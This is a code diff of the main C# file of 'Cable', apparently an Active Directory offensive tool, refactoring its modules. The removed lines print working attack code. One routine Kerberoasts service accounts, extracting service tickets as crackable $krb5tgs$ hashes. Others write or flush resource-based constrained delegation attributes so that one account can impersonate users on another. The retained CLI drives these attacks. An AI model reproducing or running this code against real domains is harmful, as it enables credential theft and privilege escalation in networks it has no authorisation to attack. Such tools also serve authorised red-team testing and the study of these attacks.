@@ -1,12 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.DirectoryServices;
-using Asn1;
 using System.DirectoryServices.ActiveDirectory;
 using System.Security.Principal;
 using System.Security.AccessControl;
-using System.Data;
 using System.Security.Cryptography;
+using Cable.Modules;
 
 namespace Cable
 {
@@ -19,7 +18,7 @@ namespace Cable
                 "Cable.exe [Module]\n" +
                 "Modules:\n" +
                 "\tenum [options] - Enumerate LDAP\n" +
-                "\tkerberoast [account] - Kerberoast a potentially supplied account, or everything\n" +
+                "\tkerberoast <account> - Kerberoast a potentially supplied account, or everything\n" +
                 "\tdclist - List Domain Controllers in the current Domain\n" +
                 "\trbcd [options] - Write or read the msDs-AllowedToActOnBehalfOfOtherIdentity attribute\n" +
                 "\ttrusts - Enumerate Active Directory Domain Trusts in the current Forest\n" +
@@ -40,10 +39,10 @@ namespace Cable
 
             string rbcdhelptext =
                 "Options:\n" +
+                "\t--write - Operation to write msDs-AllowedToActOnBehalfOfOtherIdentity\n" +
                 "\t--delegate-to <account> - Target account to delegate access to\n" +
                 "\t--delegate-from <account> - Controller account to delegate from\n" +
-                "\t--write - Operation to write msDs-AllowedToActOnBehalfOfOtherIdentity\n" +
-                "\t--remove - Operation to remove msDs-AllowedToActOnBehalfOfOtherIdentity";
+                "\t--flush <account> - Operation to flush msDs-AllowedToActOnBehalfOfOtherIdentity on an account";
 
             switch (help)
             {
@@ -58,26 +57,6 @@ namespace Cable
                     break;
             }
 
-        }
-
-        static string sidToAccountLookup(string sid)
-        {
-            SearchResultCollection results;
-
-            DirectoryEntry de = new DirectoryEntry();
-            DirectorySearcher ds = new DirectorySearcher(de);
-
-            string query = "(objectSid=" + sid + ")";
-            ds.Filter = query;
-            results = ds.FindAll();
-            string account = null;
-
-            foreach (SearchResult sr in results)
-            {
-                account = sr.Properties["samaccountname"][0].ToString();
-            }
-
-            return account;
         }
 
         static void templateLookup()
@@ -125,27 +104,6 @@ namespace Cable
             }
         }
 
-        static string accountToSidLookup(string account)
-        {
-            SearchResultCollection results;
-
-            DirectoryEntry de = new DirectoryEntry();
-            DirectorySearcher ds = new DirectorySearcher(de);
-
-            string query = "(samaccountname=" + account + ")";
-            ds.Filter = query;
-            results = ds.FindAll();
-            string accountSid = null;
-
-            foreach (SearchResult sr in results)
-            {
-                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
-                accountSid = sid.Value;
-            }
-
-            return accountSid;
-        }
-
         static void Enum(string type, string[] args)
         {
             SearchResultCollection results;
@@ -173,7 +131,7 @@ namespace Cable
                 bool t = queries.TryGetValue(type, out query);
                 if (!t)
                 {
-                    Console.WriteLine("[-] Command not recognized\n");
+                    Console.WriteLine("[!] Command not recognized\n");
                     Help("enum");
                     System.Environment.Exit(1);
                 }
@@ -183,7 +141,7 @@ namespace Cable
 
             if (results.Count == 0)
             {
-                Console.WriteLine("[-] No objects found");
+                Console.WriteLine("[!] No objects found");
                 System.Environment.Exit(0);
             }
 
@@ -217,7 +175,7 @@ namespace Cable
                     RawSecurityDescriptor rsd = new RawSecurityDescriptor((byte[])sr.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"][0], 0);
                     foreach (CommonAce ace in rsd.DiscretionaryAcl)
                     {
-                        Console.WriteLine(sidToAccountLookup(ace.SecurityIdentifier.ToString()));
+                        Console.WriteLine(RBCD.sidToAccountLookup(ace.SecurityIdentifier.ToString()));
                     }
                                         
                 }
@@ -226,66 +184,6 @@ namespace Cable
 
         }
 
-        static void WriteRBCD(string delegate_to, string delegate_from)
-        {
-            RawSecurityDescriptor rd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + accountToSidLookup(delegate_from) + ")");
-            Byte[] bDescriptor = new byte[rd.BinaryLength];
-            rd.GetBinaryForm(bDescriptor, 0);
-
-            SearchResultCollection results;
-
-            DirectoryEntry de = new DirectoryEntry();
-            DirectorySearcher ds = new DirectorySearcher(de);
-
-            string query = "(samaccountname=" + delegate_to + ")";
-            ds.Filter = query;
-            results = ds.FindAll();
-
-            foreach (SearchResult sr in results)
-            {
-                DirectoryEntry mde = sr.GetDirectoryEntry();
-                if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
-                {
-                    Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity attribute set..");
-                    return;
-                }
-                else
-                {
-                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Add(bDescriptor);
-                    mde.CommitChanges();
-                    Console.WriteLine("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity");
-                }
-            }
-        }
-
-        static void FlushRBCD(string account)
-        {
-            SearchResultCollection results;
-
-            DirectoryEntry de = new DirectoryEntry();
-            DirectorySearcher ds = new DirectorySearcher(de);
-
-            string query = "(samaccountname=" + account + ")";
-            ds.Filter = query;
-            results = ds.FindAll();
-
-            foreach (SearchResult sr in results)
-            {
-                if (sr.Properties.Contains("msDs-AllowedToActOnBehalfOfOtherIdentity"))
-                {
-                    DirectoryEntry mde = sr.GetDirectoryEntry();
-                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
-                    mde.CommitChanges();
-                    Console.WriteLine("[+] SID cleared to msDs-AllowedToActOnBehalfOfOtherIdentity");
-                }
-                else
-                {
-                    Console.WriteLine("[-] Account does not have msDs-AllowedToActOnBehalfOfOtherIdentity set");
-                    return;
-                }
-            }
-        }
-        
         static void dclist()
         {
             Domain domain = Domain.GetCurrentDomain();
@@ -318,102 +216,9 @@ namespace Cable
             }
             else
             {
-                Console.WriteLine("[-] No Domain Trusts found");
+                Console.WriteLine("[!] No Domain Trusts found");
             }
 
-        }
-
-        static string[] GetSPNs()
-        {
-            SearchResultCollection results;
-            DirectorySearcher ds = null;
-
-            DirectoryEntry de = new DirectoryEntry();
-            ds = new DirectorySearcher(de);
-            ds.Filter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
-
-            Console.WriteLine("[+] Finding Kerberoastable accounts...");
-            results = ds.FindAll();
-
-            var spns = new List<string>();
-            if (results.Count == 0)
-            {
-                Console.WriteLine("[-] No Kerberoastable accounts found :(");
-                System.Environment.Exit(0);
-            }
-            foreach (SearchResult sr in results)
-            {
-                spns.Add(sr.Properties["name"][0].ToString());
-            }
-
-            return spns.ToArray();
-        }
-
-        static bool Kerberoast(string[] spns)
-        {
-            string domain = Domain.GetComputerDomain().ToString();
-
-            System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
-            for (int i = 0; i < spns.Length; i++)
-            {
-
-                long encType = 0;
-                string spn = spns[i] + "@" + domain;
-
-                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
-                Console.WriteLine("[+] Requesting ticket...");
-                byte[] requestBytes = ticket.GetRequest();
-
-                byte[] apReqBytes = new byte[requestBytes.Length - 17];
-                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
-
-                Console.WriteLine("[+] Decoding...");
-                AsnElt apRep = AsnElt.Decode(apReqBytes);
-                foreach (AsnElt elem in apRep.Sub[0].Sub)
-                {
-                    if (elem.TagValue == 3)
-                    {
-                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
-                        {
-                            if (elem2.TagValue == 3)
-                            {
-                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
-                                {
-                                    if (elem3.TagValue == 0)
-                                    {
-                                        encType = elem3.Sub[0].GetInteger();
-                                    }
-
-                                    if (elem3.TagValue == 2)
-                                    {
-                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
-                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
-                                        string hash = "";
-
-                                        if ((encType == 18) || (encType == 17))
-                                        {
-
-                                            int checksumStart = cipherText.Length - 24;
-
-                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
-                                        }
-
-                                        else
-                                        {
-                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(0, 32), cipherText.Substring(32));
-                                        }
-
-                                        Console.WriteLine("[+] Got Hash!\n" + hash);
-                                    }
-                                }
-                            }
-                        }
-                    }
-
-                }
-            }
-
-            return true;
         }
 
         static void Main(string[] args)
@@ -428,12 +233,12 @@ namespace Cable
                         if (args.Length > 1)
                         {
                             string[] spn = { args[1] };
-                            Kerberoast(spn);
+                            Kerberoast.Roast(spn);
                         }
                         else
                         {
-                            string[] spns = GetSPNs();
-                            Kerberoast(spns);
+                            string[] spns = Kerberoast.GetSPNs();
+                            Kerberoast.Roast(spns);
                         }
 
                     }
@@ -448,6 +253,7 @@ namespace Cable
                         string delegate_from = "";
                         string delegate_to = "";
                         string operation = "";
+                        string account = "";
 
                         for (int i = 0; i < args.Length; i++)
                         {
@@ -462,8 +268,24 @@ namespace Cable
                                 case "--write":
                                     operation = "write";
                                     break;
-                                case "--remove":
-                                    operation = "remove";
+                                case "--flush":
+                                    operation = "flush";
+                                    if (delegate_to == "" && delegate_from == "")
+                                    {
+                                        if (args.Length > 2)
+                                        {
+                                            account = args[i + 1];
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine("[!] Error: please supply an account to flush");
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine("[!] Error: supplied delegate_from or delegate_to with --flush option");
+                                        return;
+                                    }
                                     break;
                             }
                         }
@@ -472,28 +294,28 @@ namespace Cable
                         {
                             if (delegate_from == "" || delegate_to == "" || operation == "")
                             {
-                                Console.WriteLine("[-] You must specify all the parameters required for an RBCD write\n ");
+                                Console.WriteLine("[!] You must specify all the parameters required for an RBCD write\n ");
                                 Help("rbcd");
                             }
                             else
                             {
-                                WriteRBCD(delegate_to, delegate_from);
+                                RBCD.WriteRBCD(delegate_to, delegate_from);
                             }
                         }
-                        else if (operation == "remove"){
-                            if (delegate_to == "" || operation == "")
+                        else if (operation == "flush"){
+                            if (account == "" || operation == "")
                             {
-                                Console.WriteLine("[-] You must specify all the parameters required for an RBCD remove\n ");
+                                Console.WriteLine("[!] You must specify all the parameters required for an RBCD flush\n ");
                                 Help("rbcd");
                             }
                             else
                             {
-                                FlushRBCD(delegate_to);
+                                RBCD.FlushRBCD(account);
                             }
                         }
                         else
                         {
-                            Console.WriteLine("[-] Please specify all parameters");
+                            Console.WriteLine("[!] Please specify all parameters");
                             Help("rbcd");
                         }
                         
@@ -524,7 +346,7 @@ namespace Cable
 
                     else
                     {
-                        Console.WriteLine("[-] Command not recognized\n");
+                        Console.WriteLine("[!] Command not recognized\n");
                         Help("mod");
                     }
                 }
@@ -537,7 +359,7 @@ namespace Cable
 
             catch (Exception e)
             {
-                Console.WriteLine("[-] Exception: " + e.ToString());
+                Console.WriteLine("[!] Exception: " + e.ToString());
             }
 
         }
